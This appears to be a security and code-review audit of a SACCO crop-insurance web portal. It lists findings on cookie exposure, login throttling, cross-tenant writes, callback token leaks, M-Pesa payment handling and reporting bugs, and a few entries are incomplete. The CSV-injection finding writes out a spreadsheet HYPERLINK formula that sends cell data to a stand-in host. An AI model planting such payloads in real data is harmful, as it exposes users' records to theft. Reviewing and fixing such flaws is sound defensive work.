title: Farmer full names are written into the session cookie through flash messages, which are signed but not encrypted
evidence: Line 215: `request.session["flash"] = [kind, text]       # never personal data`. Lines 383-390: `name = pol.farmer.full_name` ... `flash(request, "ok", f"Reminder sent to {name}.")`, `flash(request, "warn", f"{name} did not agree to SMS. Please call them instead.")`. Line 851: `f"Payout of KES {p.amount_kes:,.0f} to {p.policy.farmer.full_name} recorded as paid."`. The module docstring (line 26) says "Personal data never goes into URLs or cookies." Starlette's SessionMiddleware stores the session as base64 JSON that is signed with itsdangerous and not encrypted, and line 162 sets https_only=False.
scenario: An officer clicks Send reminder, or a manager marks a payout paid. The 303 response sets a session cookie holding "Reminder sent to Jane Wanjiru." or "Payout of KES 4,000 to Jane Wanjiru recorded as paid." Anyone who can read the cookie (browser devtools on a shared office PC, a proxy, or plain HTTP because Secure is off) can base64-decode it and read the farmer's name and payout amount. tests/test_m6b.py:141 asserts this text, so the behaviour is intended and not caught by any test.
recommendation: Keep personal data out of flash text (use the policy number or 'the member'), or keep flash messages server-side and put only a key in the cookie.
verify_reason: Confirmed. app.py:383-390 puts pol.farmer.full_name into flash() and app.py:851 puts the farmer name and payout amount there too. flash() writes to request.session (line 215, whose comment says 'never personal data'), and Starlette SessionMiddleware stores the session as signed base64 JSON that is not encrypted (line 161-162, https_only=False). This breaks the module's own rule that personal data never goes into cookies (line 26), and test_m6b.py:141 asserts the text. Rated low: the cookie goes only to the officer who already sees the name, it is popped on the next render, and reading it needs access to the browser or the traffic. Fix: use generic flash text, or keep only an id and resolve the name server-side.

title: Session cookie is never marked Secure and cannot be revoked at logout
evidence: `app.add_middleware(SessionMiddleware, secret_key=settings.session_secret, same_site="lax", https_only=False, max_age=8 * 3600)` is hard-coded and does not depend on dev_keys or MPESA_ENV. Logout (lines 341-345) only calls `request.session.clear()` on a stateless signed cookie. require() re-checks only `off.active` and nothing else on the server side.
scenario: In a production deployment behind HTTPS, the browser still sends the officer_id cookie on any plain-HTTP request to the host, for example a typed http:// URL before a redirect. A network attacker who captures it gets a working officer, manager or underwriter session. That session can approve payouts, export registers or record payments. A cookie copied before logout keeps working until its 8-hour max_age runs out, because logout cannot invalidate it.
recommendation: Set https_only=True outside development (for example `https_only=not settings.dev_keys`), and add a server-side session id or a per-officer session version so that logout and deactivation revoke cookies.
verify_reason: Confirmed. app.py:161-162 hard-codes https_only=False with no switch for production (dev_keys or MPESA_ENV), so the cookie never gets the Secure flag. Logout (341-345) only clears a stateless signed cookie, and require() re-checks only off.active, so a copied cookie stays valid for up to 8 hours. Rated low, not medium: theft needs plain-HTTP exposure plus a network attacker, or access to the device, and not being able to revoke a signed cookie is a known limit of the design. Fix: set https_only from config (true outside dev) and add a server-side session version or nonce checked in require().

title: Login has no rate limiting or lockout, and failed-login audit stores the raw typed username
evidence: Lines 327-334: `off = s.scalar(select(Officer).where(Officer.username == username.strip()))` then `if off is None or not off.active or not verify_password(...)`: `audit(s, username.strip()[:60] or "?", "login.failed", "officer")`. Nothing counts attempts per username or per IP. scrypt runs only when the username exists, so response time shows which usernames exist. The actor field is not passed through scrub() (db.audit scrubs only **details).
scenario: An attacker scripts POST /login: GET /login gives a fresh session and CSRF token, then passwords are tried without limit against 'manager' or an underwriter account. Timing confirms valid usernames first. Separately, an officer who types their password or a farmer's phone number into the username box has that value stored in clear in audit_event.actor.
recommendation: Add per-username and per-IP throttling or lockout with backoff, run a dummy scrypt for unknown users, and scrub or hash the attempted username before auditing it.
verify_reason: Confirmed. login (app.py:327-334) has no per-user or per-IP throttle or lockout, and verify_password (scrypt) runs only when the username exists, so response time reveals valid usernames. audit() scrubs only **details (db.py:46-49), so the actor field stores up to 60 characters of whatever was typed as the username. Rated low: cli._password requires at least 10 characters, and scrypt at n=2^14 slows online guessing; the unlimited scrypt work is a small DoS lever. Fix: add attempt throttling, run a dummy scrypt for unknown users, and scrub or replace the actor on login.failed.

title: Plain officers can bulk-enrol and export the whole SACCO policy register, although these are documented as manager-only
evidence: `/import` uses `require(request, s, role="manager")` (line 690), but `/bulk` (line 695), `/bulk/check` (line 709), `/bulk/commit` (line 719) and `/export/policies.csv` (line 1182) call `require(request, s)` with no role. README line 150: "Managers also get Reports (the portfolio, map and export) and Import (bulk CSV and KIAMIS together)." base.html shows the Reports and Import links only `{% if role == 'manager' %}`. The export (services.py 514-525) includes full_name, member_no, masked ID and phone, loan_ref and payment status for every policy in the SACCO.
scenario: An officer who does not see the Reports link types /export/policies.csv and downloads every member's name, member number, loan reference and payment status. They can also POST /bulk/check and /bulk/commit to enrol hundreds of policies, bypassing the manager-only Import page. Tests (test_platform.py 364, 437) exercise these routes as an officer, so the gap is not caught.
recommendation: Use role="manager" on /bulk, /bulk/check, /bulk/commit and /export/policies.csv to match /import and the README, and update the tests.
verify_reason: Refuted as a privilege problem. Officer access to /bulk is deliberate: test_m6b.py:110 fetches /bulk as an officer and asserts only that the KIAMIS section stays manager-only. test_platform.py:364 exports as the default officer. The export is limited to off.sacco and masks national ID and phone (services.py:519-525). Its contents (name, member_no, status, balance, loan_ref) are the same own-SACCO data an officer already sees on /members and /members/{id} (member.html lines 4-5 and 20 show loan_ref). At most this is a nav and README inconsistency, not a tenancy or confidentiality breach.

title: Any single SACCO's manager can change records shared by all SACCOs and insurers (weather advisories, KIAMIS records)
evidence: weather_approve, weather_withdraw (lines 930-952) and weather_upload use `get_or_404(s, WeatherItem, item_id)` with no SACCO or insurer scoping. Approved items show on every SACCO's Home (`weather=wx.visible_items(s, c.date())`, line 374) and every insurer's /uw/weather (line 1154). kiamis_import (lines 735-747) calls `CsvKiamis(vault).import_csv(s, text)`, which overwrites the global KiamisRecord for any national ID hash (kiamis.py 68-78). services.preview then uses it in every SACCO's quotes: `if kiamis.certified_seed_purchased: resilience["certified_seed_verified"] = True`.
scenario: A manager at SACCO A approves a weather item with an arbitrary 480-character 'summary'. It appears as an official advisory on the Home page of every officer at SACCO B and in every insurer's workspace. They can also withdraw advisories that other SACCOs depend on. The same manager can upload a KIAMIS CSV that flips certified_seed_purchased or subsidy_eligible for farmers enrolled by other SACCOs, which changes the resilience discount on those SACCOs' quotes.
recommendation: Restrict platform-wide records (weather approval and withdrawal, KIAMIS import) to a platform or admin role, or scope them per SACCO.
verify_reason: Confirmed. WeatherItem and KiamisRecord have no sacco_id or insurer_id (models.py:229-238, 338-356). weather_approve and weather_withdraw (app.py:930-952) only check role='manager' and use get_or_404 with no scoping. wx.visible_items returns every approved item to every SACCO's Home and to /uw/weather. kiamis_import (735-747) lets any SACCO's manager overwrite the global KiamisRecord for any national_id_hash (kiamis.py:68-78), and services.preview (204-205) uses it to set the certified_seed resilience discount in every SACCO's quotes. This is real cross-tenant write access, but it needs a malicious or careless manager (an insider), so medium. It touches the role model and pricing inputs. Fix: give these shared records a platform-level owner role, or scope them per SACCO or insurer.

title: CSV exports write user-controlled text without neutralising spreadsheet formulas
evidence: export_policies_csv: `w.writerow([p.policy_no, p.insurer_policy_number or "", f.member_no, f.full_name, ... p.loan_ref or "", ...])`. underwriting.bordereaux line 177 writes `p.farmer.member_no`, `p.insurer_policy_number`, and on line 192 `p.reference`. settlement_csv (app.py 429-431) writes `e.period or ""` and `e.review_note`. None of these fields is checked for a leading = + - @. full_name and member_no come from free-text enrolment or from an uploaded bulk CSV, period is 20 characters of free text from a manager, and review_note is free text from an underwriter.
scenario: A member is enrolled (by hand or through a bulk file from another system) with full_name `=HYPERLINK("http://x.example/?"&A2,"Jane")`. When the manager or insurer opens agroshield-policies.csv or the bordereaux premium.csv in Excel, the cell runs as a formula. It can send neighbouring cells (policy numbers, names) to an outside host when clicked, or trigger DDE prompts.
recommendation: Prefix any exported cell that starts with = + - @ tab or CR with a single quote in one shared CSV-writer helper.
verify_reason: Confirmed. services._validate (147-154) only strips full_name and member_no and checks they are non-empty. export_policies_csv (521), underwriting bordereaux (177-192) and settlement_csv (app.py:429-431) write those values, period and review_note straight into csv.writer, and no code anywhere neutralises a leading =, +, - or @. A name like =HYPERLINK(...) becomes a live formula when the file is opened in Excel. Low: it needs a malicious data entry, and the user still has to act in the spreadsheet. Fix: prefix a ' to cells that start with =, +, -, @, tab or CR in the CSV writers.

title: Public enquiry forms are throttled only per browser session, so the limit is trivially bypassed
evidence: `last = request.session.get("enquiry_at", 0)` / `if time.time() - last < 20: raise HTTPException(429, ...)`. The timestamp lives in the client's own cookie. The other controls are a CSRF token, which a fresh GET supplies, and a honeypot field `website`. Each accepted POST stores an encrypted PublicEnquiry row (enquiries.record) with no global cap, and retention is still undecided.
scenario: A bot does GET /demo, reads csrf_token, POSTs, drops the cookie and repeats. It can insert unlimited demo or livestock enquiries, filling the database with junk and burying real requests in `agroshield-portal enquiries`. The 20-second limit never applies because each request has a new session.
recommendation: Add an IP-based (or global) rate limit for POST /demo and /livestock, and cap stored enquiries per time window.
verify_reason: Confirmed. enquiry_post (app.py:293-303) throttles on request.session['enquiry_at'], which lives in the client's own cookie. A bot that drops the cookie and gets a fresh CSRF token from GET /demo bypasses the throttle. enquiries.record (44-75) has no global cap, so each POST stores an encrypted PublicEnquiry row. Impact is spam and database growth only, so low. Fix: add a server-side per-IP or global rate limit or a daily cap.

title: Callback secret token and unscrubbed exception text reach logs
evidence: cli.py 76-78 adds ScrubFilter only to the root handlers (`for h in logging.getLogger().handlers: h.addFilter(ScrubFilter())`), then line 154 runs `uvicorn.run(...)`. uvicorn installs its own `uvicorn.access` and `uvicorn.error` handlers (propagate=False), and these log the full request line. The only authentication for the callbacks is the path secret: `POST /ussd/{token}`, `/mpesa/callback/{token}` (app.py 796-807, `check_token`). ScrubFilter (crypto.py 70-74) rewrites only record.msg and record.args, not exc_info. app.py 1205 does `log.exception("unhandled error on %s", ...)`.
scenario: Every Safaricom or Africa's Talking callback writes `POST /mpesa/callback/<CALLBACK_TOKEN>` to the access log. Anyone who can read server or hosting logs can then post forged USSD requests to look up any farmer's cover by phone number, or trigger STK pushes. An unhandled error whose message includes bound SQL parameters (for example farmer full_name) is logged with the traceback unscrubbed.
recommendation: Pass a uvicorn log_config that applies ScrubFilter and redacts the callback path segment, and scrub formatted exception text (override formatException or filter exc_text).
verify_reason: Confirmed. cli.py:76-78 attaches ScrubFilter only to the root handlers, and uvicorn.run (line 154) uses its default LOGGING_CONFIG. There uvicorn.access has its own handler with propagate=False, and it logs the full request line, which carries the callback secret in POST /mpesa/callback/{token} and /ussd/{token}. check_token (app.py:205-207) is the only authentication on those routes. ScrubFilter (crypto.py:70-74) also leaves exc_info tracebacks from log.exception (app.py:1205) unscrubbed. Exploiting the token leak needs access to the logs, so low. Fix: pass a log_config that filters or redacts the access log, and scrub exception text.

title: File uploads are read whole into memory with no size limit
evidence: bulk_check: `text = (await file.read()).decode("utf-8-sig", errors="replace")` (line 707, any officer). kiamis_import line 738 and weather_upload line 915 (`data = await file.read()`) do the same. None checks the size, and the bulk text is then kept in the in-memory PendingStore for 30 minutes. The weather PDF check is only `data.startswith(b"%PDF")` before the file is written to disk and parsed by pypdf.
scenario: A signed-in officer (or a stolen officer session) uploads a multi-GB file to /bulk/check, or several large ones. The single-process portal reads each one fully into RAM and keeps valid ones in PendingStore, which can exhaust memory and take the portal down for every SACCO.
recommendation: Reject uploads above a fixed size (for example a few MB for CSV and 20 MB for PDF) before reading, by checking Content-Length and reading in bounded chunks.
verify_reason: Confirmed and slightly worse than reported. bulk_check (app.py:704-707), kiamis_import (735-738) and weather_upload (912-915) call `await file.read()` with no size limit before require(). Only check_csrf runs first, and a CSRF token comes from any anonymous GET /login. So an unauthenticated client can make the single-process portal load an arbitrarily large upload into RAM, and Starlette's multipart parser has no file size cap by default. A valid bulk text is also kept in PendingStore for 30 minutes. Fix: call require() before reading, cap the request or upload size, and read in limited chunks.

title: M-Pesa callback left 'unconfirmed' is never credited or re-checked, so a farmer's money can be taken with no cover
evidence:
mpesa.py:199-202: `if getattr(ctx.mpesa, "confirm_with_query", False):
    if ctx.mpesa.stk_query(req.checkout_request_id)["result_code"] != 0:
        audit(..."mpesa.callback_unconfirmed"...)
        return {"outcome": "unconfirmed"}      # stays pending; a later callback or query can complete it`. DarajaClient.stk_query returns result_code None whenever the response has no ResultCode (`int(d["ResultCode"]) if "ResultCode" in d else None`), for example the 'transaction is being processed' answer a query sent straight after the callback can get. The route then acknowledges the callback anyway (app.py mpesa_callback returns `{"ResultCode": 0, "ResultDesc": "Accepted"}`), so Safaricom will not resend it. A search of src/ finds stk_query called only here, and no job re-queries pending MpesaRequest rows. confirm_with_query defaults to True (settings.py:42).
scenario: In production a farmer approves a KES 1,500 STK push. The callback reports success, but the immediate STK query comes back without a ResultCode. handle_callback returns 'unconfirmed', the request stays 'pending' with no Payment row, and the portal answers Safaricom with 'Accepted'. Nothing ever re-checks it. The money has left the farmer's M-Pesa, but the policy stays pending_payment. close_sales_windows then lapses it, with refund_due_kes counting only what was recorded, so the cover never starts and the M-Pesa money appears in no ledger.
recommendation: Add a scheduled re-query of pending MpesaRequests that have had a success callback (store the callback metadata on the request), and credit them once confirmed. Or treat a query with no ResultCode as 'retry later' and track it on the request.
verify_reason: Confirmed. mpesa.py:199-202 returns 'unconfirmed' and leaves the request pending whenever stk_query's result_code is not 0. DarajaClient.stk_query (mpesa.py:96) returns None when the response has no ResultCode, which happens on Daraja errorCode responses such as 'being processed' or spike-arrest. app.py:816 still answers 'Accepted', so Safaricom will not resend. stk_query is called nowhere else and no job re-queries pending MpesaRequest rows. The portal's only manual entry is the 'sacco_deduction' route (app.py:667), so an M-Pesa receipt cannot be credited from the UI. confirm_with_query defaults to True (settings.py:42/106). The farmer's money is taken but no Payment row is written, and close_sales_windows later lapses the policy. Fix: re-query pending requests on a schedule, or credit on a later query, and never treat a missing ResultCode as final. Touches money handling.

title: Settlement 'collected' and UW money 'received' count money owed back to farmers as premium owed to the insurer
evidence: settlement.py:107-109 adds every Payment row for the insurer's policies: `for pm, sid in s.execute(select(Payment, Policy.sacco_id)...): collected[sid] += pm.amount_kes`, and outstanding is `max(0.0, round(col - remitted, 2))` (line 121). This includes payments on lapsed_unpaid policies (services.py:326 `pol.status, pol.refund_due_kes = "lapsed_unpaid", round(pol.paid_kes, 2)`) and overpayments on active policies (services.py:323). The SMS templates tell the farmer this money 'will be refunded through your SACCO' (locales/en.yaml:54-56). underwriting.money does the same (lines 126-129: `r["farmer_kes"] += pm.amount_kes`) and shows the refunds only as a separate tile. Because the two use the same basis they agree with each other, but both overstate the premium the SACCO owes.
scenario: A farmer pays a KES 2,000 SACCO deduction one day after sales close. The policy goes to lapsed_unpaid with refund_due_kes 2000. On /reports/premium and /uw/money#settlement, the SACCO's 'collected' and 'still to send' both go up by KES 2,000, so the manager is told to remit KES 2,000 that the SACCO must actually return to the farmer. The same happens for any overpayment, such as a second STK push paid after the cover became active.
recommendation: Base settlement 'collected' (and the money tiles) on premium kept: sum of paid_kes - refund_due_kes per policy, or Payments net of refunds. Keep refunds as their own figure.
verify_reason: Confirmed. settlement.summary (lines 107-110) sums every Payment for the insurer's policies into 'collected', and outstanding is col - remitted (line 121). Payments on lapsed_unpaid policies (refund_due_kes = paid_kes, services.py:326/352) and overpayments (services.py:323/330) are included. So 'Still to send' (settlement.html:14) asks the SACCO to remit money it owes back to farmers. The module docstring defines collected as 'farmer premium', which this is not. underwriting.money uses the same basis for farmer_kes. Fix: subtract refund_due_kes per SACCO (collected = paid minus refunds owed). Touches money handling.

title: Replanting voucher expiry is never enforced, and expiry runs from confirmation rather than issue
evidence: approve() at monitoring.py:167-171 issues the voucher and sends `expires=(p.confirmed_on + timedelta(days=mon.voucher_valid_days))` with no check that this date is still in the future. pay() at lines 221-225 marks any 'issued' voucher redeemed without comparing today to that expiry: `if p.method == "voucher": ref = ...; p.status, p.reference = "redeemed", ref[:40]`. No other code reads voucher_valid_days except payouts.html, which only displays it.
scenario: A germination dry spell confirms on 20 Apr (voucher_valid_days 30). The underwriter holds the voucher, then approves it on 25 May. The farmer gets an SMS with a voucher code that 'expires 20/05/2027', already in the past. A manager then marks a different voucher redeemed on 10 Jun, 51 days after confirmation, and it goes through, so the insurer pays an agro-dealer for an expired voucher. Neither the issued nor the redeemed state reflects the configured validity.
recommendation: Decide whether validity runs from confirmed_on or approved_at. Then refuse issue (or reset validity) after expiry, reject redemption in pay() after expiry, and add an 'expired' status.
verify_reason: Partly confirmed. approve() (monitoring.py:167-171) sends voucher_issued with expires = confirmed_on + voucher_valid_days and never checks that this date is still in the future. A voucher held past 30 days and then approved therefore reaches the farmer already expired. The pay()/redeem half is weaker: the manager records the agro-dealer's reference after the fact, so the recording date is not the redemption date, and a check there would be the wrong control. Severity lowered because it needs a long hold and the underwriter acts on purpose. Fix: when a voucher is approved after its expiry, block it or move expiry to start from issue. Touches payout logic.

title: A payment received on or before the close date is still refunded if the daily lapse job ran first
evidence: services.py:316 computes `within = at.astimezone(NAIROBI).date() <= pol.sales_closes_on` from the M-Pesa TransactionDate (mpesa.py:206-207 passes `received_at=_txn_time(...)`). Line 325 then still lapses it: `elif not within or pol.status == "lapsed_unpaid": pol.status, pol.refund_due_kes = "lapsed_unpaid", round(pol.paid_kes, 2)`. close_sales_windows (lines 350-352) lapses every pending policy as soon as `days_left < 0`, whatever STK requests are still in flight.
scenario: Sales close 14 Feb. The farmer pays the final balance by M-Pesa at 23:58 on 14 Feb, and the callback (or its confirming query) is processed at 00:10 on 15 Feb, after the daily close job has already lapsed the policy. The Payment row is saved with within_window=True, yet the policy stays lapsed_unpaid and the farmer gets the 'late_payment' SMS saying the cover did not start, although they paid on time.
recommendation: When `within` is true and the policy was lapsed only by close_sales_windows, re-evaluate it as on-time: activate it if fully paid. Alternatively, have the close job skip policies with pending STK requests created before the close.
verify_reason: The logic is confirmed: services.py:325 `elif not within or pol.status == "lapsed_unpaid"` lapses a payment even when within=True from the M-Pesa TransactionDate. close_sales_windows (350-352) lapses pending policies without looking for STK requests still in flight. The trigger is a narrow race, though. The TransactionDate must be on or before the close date, but the callback must be processed after the close job has run. Callbacks normally arrive within seconds, and the M-Pesa callback is the only path that passes a past received_at (officer deductions use ctx.now()). Severity lowered to low. Fix: when a within-window payment arrives on a policy lapsed by the job, reinstate it, or delay the lapse while STK requests are pending. Touches money and policy-status handling.

title: No way to reverse a mistaken premium payment or record that a refund was paid
evidence: models.py:176 says of Payment: "Never edited; a reversal is a new row." But record_payment refuses anything that is not positive: `if not amount or amount <= 0: raise PaymentError("amount must be more than 0")` (services.py:311-312). paid_kes and refund_due_kes are assigned nowhere outside record_payment and close_sales_windows, so refund_due_kes is never reduced once the SACCO refunds the farmer. The member form allows any whole number (member.html:35 `type="number" min="1" step="1"`).
scenario: An officer records a SACCO deduction of 15000 instead of 1500. The policy becomes active with refund_due_kes 13,500, settlement 'collected' rises by 13,500, and the bordereau farmer_paid_kes is wrong. There is no supported way to correct it. Likewise, after the SACCO hands a lapsed farmer their KES 2,000 back, 'Refunds owed to farmers' still shows KES 2,000 indefinitely.
recommendation: Add an audited manager-only reversal (a negative Payment that references the original) and a 'refund paid' record that reduces refund_due_kes, both feeding settlement and money totals.
verify_reason: Confirmed. record_payment rejects amount <= 0 (services.py:311-312), so the 'a reversal is a new row' promise in models.py:176 cannot be kept. paid_kes and refund_due_kes are written only in record_payment and close_sales_windows (grep), so no refund can ever be marked as paid. The deduction route (app.py:667) puts no cap on the amount, so a typo such as 15000 for 1500 makes the policy active with a large refund_due and inflates settlement 'collected' permanently. Fix: add an audited reversal/refund-paid operation that writes a negative Payment or a refund record. Touches money handling.

title: Bordereaux and ESG use the UTC date of naive SQLite datetimes, and stored datetimes mix UTC and Nairobi wall time
evidence: SQLite DateTime(timezone=True) drops tzinfo without converting (checked in a scratch script: an EAT 01:30 value and a UTC 01:30 value both read back as naive 01:30). created_at, paid_at and approved_at come from `datetime.now(timezone.utc)` (UTC wall time). Payment.received_at and Policy.cover_active_from come from ctx.now()/_txn_time in NAIROBI (EAT wall time). The bordereaux bucket uses UTC: `written = [p for p in pols if start <= p.created_at.date() < end]` (line 168), `p.created_at.date().isoformat()` as written_on (line 180), months_with_activity `p.created_at.strftime("%Y-%m")` (line 212), and esg `days = [(p.paid_at.date() - p.confirmed_on).days ...]` (line 287) subtracts a Nairobi date from a UTC date. The premium CSV writes cover_active_from (EAT) and the payout CSV writes approved_at/paid_at (UTC) with no offset.
scenario: A policy enrolled by USSD at 01:30 EAT on 1 March has created_at 22:30 UTC on 28 Feb. It appears in the February premium bordereau with written_on 2027-02-28, and is missing from March. A payout paid at 01:00 EAT counts one day fewer in median_days_to_pay.
recommendation: Read naive datetimes as UTC or EAT according to how each column was written (or always store UTC), and convert to Africa/Nairobi before taking .date() or month buckets. Write offsets in CSV timestamps.
verify_reason: Confirmed. models._now and approved_at/paid_at use datetime.now(timezone.utc), while ctx.now() and _txn_time use NAIROBI (services.py:109-111, mpesa.py:167-169). SQLite DateTime(timezone=True) stores and returns naive values. underwriting.bordereaux buckets by p.created_at.date() (line 168) and writes it as written_on (line 180), so a policy written between 00:00 and 03:00 EAT on the 1st lands in the previous month's bordereau. esg (line 287) subtracts the confirmed_on Nairobi date from paid_at's UTC date. This is reporting skew only, with no money moved. Fix: convert to Nairobi (treating the naive values as UTC) before taking .date() in reports.

title: KAIP subsidy receivable includes lapsed policies on the SACCO dashboard but excludes them in the insurer's Money page
evidence: services.portfolio: `"subsidy_receivable_kes": sum(p.government_share_kes for p in pols if p.subsidy_status == "not yet received")`, where pols is every non-cancelled policy, lapsed_unpaid included. underwriting.money line 136: `if p.subsidy_status == "not yet received" and p.status != "lapsed_unpaid": r["subsidy_kes"] += p.government_share_kes`.

title: Quote breakdown 'Farmer pays' rounds to nearest while the amount due is rounded up, so it can show 1 KES less

The policy's amount due is `math.ceil(q["farmer_pays_kes"] - 1e-9)` (services.py:271), and plain_price (app.py:350), SMS (locale.kes) and STK limits also use ceil. import.html:15/40 and reports.html:87 also show farmer_pays_kes with |kes.
scenario: With a quoted farmer share after discount of KES 1,234.40, the quote breakdown and the import preview say 'Farmer pays KES 1,234'. The enrolment confirmation, SMS and M-Pesa request then ask for KES 1,235, and the officer cannot explain the extra shilling to the farmer.

title: M-Pesa B2C payout sends a half-even rounded amount, but the payout is recorded as paid in full
evidence: monitoring.py:235 `p.reference = ctx.mpesa.b2c(phone, int(round(p.amount_kes)), ...)` then `p.status = "paid"`. Meanwhile amount_kes (`round(max(0.0, min(ev[kind]["share"] * cap, cap - already)), 2)`, line 145) keeps its cents and is what the audit, SMS, bordereaux and money totals report as paid.
scenario: A WRSI payout with share 0.3127 on 1.5 acres at KES 10,000/acre gives amount_kes 4690.50. Python's round(4690.5) is 4690, so B2C sends KES 4,690, while the payout row, the 'payout.paid' audit and payouts.csv all record 4,690.50 as paid. The KES 0.50 shortfall to the farmer is never recorded, and payout totals no longer reconcile with the M-Pesa statement.
recommendation: Round payout amounts to whole KES when the payout is calculated (rounding up in the farmer's favour, if the rules allow) and send exactly that stored amount.
verify_reason: Not reachable as described. DarajaClient.b2c (mpesa.py:85-88) always raises MpesaError ('not configured yet'), so production sends no B2C money. Only SimulatedDaraja.b2c succeeds, and it moves no money. No M-Pesa statement exists to fall out of reconciliation, and no farmer is short-paid. At most this is a latent concern for when B2C is built, not a confirmed bug.

title: /uw/bordereaux builds 12 complete CSV+ZIP exports, with per-row lazy loads, just to show manifests
evidence: app.py:1111 `manifests = [uw.bordereaux(s, off.insurer, mth, dict(cfg.file_hashes))[1] for mth in months[:12]]`. Each call (underwriting.py:162-207) reloads every policy via policies(), every Sacco and every Payout for the insurer. It lazy-loads `p.farmer` per written policy (:177 `p.farmer.member_no, p.farmer.national_id_masked...`) and `p.policy.farmer` per payout (:187-188), then builds both CSVs and deflates a ZIP. The ZIP bytes are thrown away (`[1]`).
scenario: An insurer with 20,000 policies over 12 active months opens the Bordereaux tab. The page does 12 full scans of policies and payouts, thousands of farmer lookups, and 12 ZIP compressions before it renders a list of row counts and checksums. That is several seconds per view on SQLite.
recommendation: Compute the manifest (row counts, plus checksums if needed) with a light per-month query, or cache manifests per month. Eager-load farmer with selectinload in bordereaux().
verify_reason: Confirmed. app.py:1111 calls uw.bordereaux up to 12 times only to keep the manifest. Each call re-runs policies(), the Sacco and Payout queries, builds both CSVs and deflates a ZIP that is then discarded (underwriting.py:162-207). The severity is overstated: after the first call, the many-to-one farmer and policy lazy loads mostly resolve from the session identity map, so the repeated cost is mainly the scans, CSV building and compression. Still wasteful. Fix: split out a manifest-only function, or compute once and group by month.

title: Payout Tracker and SMS log lazy-load policy and farmer per row, and count policies by loading them all

It then runs `n_active = len(s.scalars(select(Policy).where(..., Policy.status == "active")).all())`, loading full Policy rows just to count them. payouts.html:24 `{{ p.policy.farmer.full_name }}` and :29/:35 `p.policy.loan_ref` trigger lazy loads per payout. sms.html:15 `{{ m.farmer.member_no }}` / `m.farmer.phone_masked` lazy-loads per message over 200 rows (app.py:755).

title: Underwriter pages load the whole book into Python repeatedly and bind every policy id into IN lists
evidence: underwriting.py:101 `select(Payout).where(Payout.policy_id.in_(ids))` with `ids = [p.id for p in pols]`; the same at :120-121 (money: every Payment ORM row summed in Python), :155 (charts), :185 (bordereaux), :214 and :283/:301 (esg, which also lazy-loads `p.farmer` per policy at :281 `farmers = {p.farmer_id: p.farmer for p in pols}`). The /uw route calls uw.policies() twice per request (app.py:997 in uw_filters and :1004 in uw_filtered). settlement.py:107 likewise loads every Payment object to sum amount_kes.
scenario: An insurer book of about 40,000 policies: every /uw, /uw/money and /uw/reinsurer view loads all policies (twice on /uw) and all payments. It sends a 40,000-parameter IN clause, which exceeds SQLite's 32,766-variable limit (local SQLite is 3.49.1). That raises OperationalError 'too many SQL variables', so the underwriter workspace returns 500.
recommendation: Replace id IN-lists with a join or subquery on Policy.insurer_id, push sums into SQL aggregates (func.sum ... group_by), eager-load farmer in esg(), and reuse one policies() result per request.
verify_reason: Confirmed. underwriting.py:101, :120-121, :185, :214, :283, :301 and :354 bind every policy id into IN(...), and app.py:997 and :1004 call uw.policies() twice per /uw request. I reproduced the failure in scratch with the installed SQLAlchemy 2.0.35 and SQLite 3.49.1: an IN of 40,000 string ids raises OperationalError 'too many SQL variables'. This only bites once one insurer's book passes about 32,766 policies, far beyond pilot scale, so the severity stays low. Fix: use a join or subquery on Policy.insurer_id instead of id lists.

title: Static assets are served with no Cache-Control, no compression and no versioned URLs
evidence: app.py:163 `app.mount("/static", StaticFiles(directory=HERE / "static"), name="static")`. There is no custom headers subclass and no GZipMiddleware (grep finds no GZip or max-age in the package). base.html:10-12 loads `/static/tokens.css`, `/static/app.css` (445 lines, about 34KB) and `/static/nav.js` on every page with unversioned URLs. Fonts (eb-garamond-latin.woff2 44KB) and the 100-470KB photos have no explicit caching either.
scenario: An officer on a rural 3G connection moves between Home, Members and a member page. Each navigation revalidates CSS, JS and fonts (heuristic caching only, ETag round trips), and app.css goes over the wire uncompressed. Pages are slower to show and use more of the officer's mobile data.
recommendation: Serve /static with Cache-Control (e.g. max-age=31536000, immutable) behind hashed or ?v= URLs, and add GZipMiddleware (minimum_size around 1KB) for HTML, CSS and JS.
verify_reason: Confirmed but weak. app.py:163 uses plain StaticFiles with no GZip middleware or Cache-Control (grep finds only a no-store header at :419), and base.html:10-12 loads unversioned assets. Starlette does send ETag and Last-Modified, so repeat views are conditional 304s rather than full downloads, which limits the impact. The repo documents no compressing reverse proxy. Fix: add GZipMiddleware plus versioned URLs with long max-age.

title: With real keys, MPESA_ENV still defaults to 'simulated', so the M-Pesa simulator and fake B2C payouts work in production
evidence: app.py:769-791 only checks the M-Pesa mode on the simulator routes: `if state["mpesa"].env != "simulated": raise HTTPException(404)`. It never checks settings.dev_keys. settings.py:103 has `env=e("MPESA_ENV", "simulated")`, and settings.py:113 only refuses `dev and (mpesa.env == "production" or sms.mode == "live")`. So real keys with MPESA_ENV unset and SMS_MODE=live is accepted. mpesa.py:114-116 `SimulatedDaraja.b2c` does `return "SIMB2C" + secrets.token_hex(4).upper()` and its docstring says 'no money moves'. monitoring.py:231-236 then sets `p.status = "paid"` and queues the payout_paid SMS. tests/test_m6.py:379-383 runs the simulator with `dev_keys=False` (test_platform settings fixture) and the policy becomes '>active<'. README.md:152 says 'the SMS log and M-Pesa simulator appear only with development keys'. Only the menu link is hidden (base.html:47 show_dev); the routes stay open.
scenario: An operator sets the four real keys and SMS_MODE=live but leaves out MPESA_ENV. Any officer can open /dev/mpesa and POST /dev/mpesa/<id>/success, which credits a premium that was never paid and activates cover. A manager pressing Pay now on an approved M-Pesa payout records it as paid with a SIMB2C receipt, and the farmer gets a live SMS saying the payout was paid, but no money moved.
recommendation: When real keys are set, refuse to start unless MPESA_ENV is set explicitly. Also gate the /dev/mpesa routes and simulated B2C on settings.dev_keys, add a test for this, and correct README line 152.
verify_reason: Confirmed. settings.py:103 defaults MPESA_ENV to 'simulated', and settings.py:113 only refuses dev keys combined with production M-Pesa or live SMS, so real keys with SMS_MODE=live and MPESA_ENV unset are accepted. app.py:771/783 gate /dev/mpesa only on mpesa.env, never on dev_keys. base.html:45 shows the simulator link whenever mpesa_env=='simulated', so README.md:152 ('only with development keys') is wrong. mpesa.py:114-116 SimulatedDaraja.b2c returns a SIMB2C receipt, and monitoring.pay then sets status 'paid' and queues the payout_paid SMS, which goes out live. It needs an operator misconfiguration, so medium, not high. touches_protected=true (money handling); recommendation: refuse simulated M-Pesa when real keys or live SMS are set, or also require dev_keys on the /dev routes.

No trigger is ever confirmed, no payouts are created, and nothing flags this as an alert. Farmers who paid for cover cannot be paid by the index they bought. recommendation: Decide and document the LR 2027 index data source with the underwriter (CHIRPS v3 and/or a contractual fallback, with re-pricing on it). Make a data_unavailable status inside a live season an alert, not level 'none'.

